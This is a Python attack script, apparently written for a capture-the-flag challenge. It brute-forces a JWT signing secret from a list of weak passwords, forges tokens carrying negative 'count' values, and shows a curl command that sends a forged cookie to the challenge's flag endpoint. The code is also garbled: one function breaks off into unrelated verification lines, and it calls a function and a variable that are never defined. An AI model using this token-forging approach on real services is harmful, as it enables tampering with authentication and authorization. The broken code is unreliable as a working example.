#!/usr/bin/env python3
"""
JWT Negative Number Attack for Lower Numbers Challenge
Focus: Only negative numbers as per hint
"""

import base64
import json
import hmac
import hashlib
import requests

def decode_jwt(token):
    """Decode JWT token to see its contents"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    # Decode header
    header = parts[0] + '=' * (4 - len(parts[0]) % 4)
    header_data = json.loads(base64.urlsafe_b64decode(header))
    
    # Decode payload
    payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
    payload_data = json.loads(base64.urlsafe_b64decode(payload))
    
    # Create the message to sign
    message = f"{header_b64}.{payload_b64}"
    
    # Create signature with the secret
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    computed_signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return computed_signature_b64 == signature_b64

def create_jwt_with_count(count, secret):
    """Create a JWT with specified count using the secret"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"count": count}
    
    # Encode header and payload
    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
    
    # Create signature
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return f"{header_b64}.{payload_b64}.{signature_b64}"

def main():
    print("🔐 JWT Secret Cracker")
    print("=" * 50)
    
    # Common secrets to try
    secrets = [
        # Very common weak secrets
        "", "secret", "password", "123456", "admin", "key", "jwt", "token",
        "your-256-bit-secret", "mysecretkey", "supersecret", "challenge",
        "bootup", "ctf", "flag", "test", "dev", "development", "production",
        
        # Challenge specific
        "lower", "numbers", "count", "click", "clicks", "counted", "cool",
        "cooler", "web", "app", "application",
        
        # Common patterns
        "secretkey", "secret123", "password123", "key123", "jwt_secret",
        "hmac_secret", "signing_key", "private_key", "auth_secret",
        
        # Weak/default secrets
        "changeme", "default", "example", "demo", "sample", "weak",
        "insecure", "notsecure", "vulnerable"
    ]
    
    print(f"Testing {len(secrets)} potential secrets against known JWT...")
    print(f"Known JWT: {known_jwt}")
    
    for secret in secrets:
        if verify_jwt_secret(known_jwt, secret):
            print(f"\n🎯 SECRET FOUND: '{secret}'")
            
            # Now create JWTs with different count values
            print(f"\nCreating JWTs with the found secret:")
            
            for count in [-100, -10, -1, 0]:
                jwt = create_jwt_with_count(count, secret)
                print(f"Count {count:4}: {jwt}")
            
            return secret
    
    print(f"\n❌ Secret not found in common list")
    print(f"💡 Try using a more comprehensive wordlist or online JWT cracker")
    
    return None

if __name__ == "__main__":
    secret = main()
    if secret:
        print(f"\n✅ Use the JWTs above as Cookie values to test the challenge")
        print(f"Example: curl -H 'Cookie: d=<JWT>' https://cpp.bootupctf.net:8085/flag")
